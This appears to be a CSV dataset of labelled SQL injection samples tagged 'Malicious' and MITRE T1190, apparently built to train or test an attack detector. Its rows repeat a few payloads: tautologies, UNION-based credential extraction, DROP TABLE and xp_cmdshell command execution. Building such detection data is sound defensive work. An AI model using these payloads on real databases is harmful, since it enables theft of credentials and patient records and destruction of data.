Payload,Signature,AttackType,Severity,MITRE,Label,Description
' AND 1=1--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; EXEC xp_cmdshell('dir')--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
1' ORDER BY 1--+,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
1' ORDER BY 1--+,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; EXEC xp_cmdshell('dir')--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
"' UNION SELECT username,password FROM users--",Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
' OR 1=1#,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; DROP TABLE users--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
"' UNION SELECT username,password FROM users--",Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; DROP TABLE users--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
' OR 1=1#,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
' AND 1=1--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; DROP TABLE users--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
'; DROP TABLE users--,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
1' ORDER BY 1--+,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
' OR 1=1#,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
1' ORDER BY 1--+,Healthcare SQL Injection,Healthcare SQL Injection,Critical,T1190,Malicious,Healthcare SQL injection targeting patient data
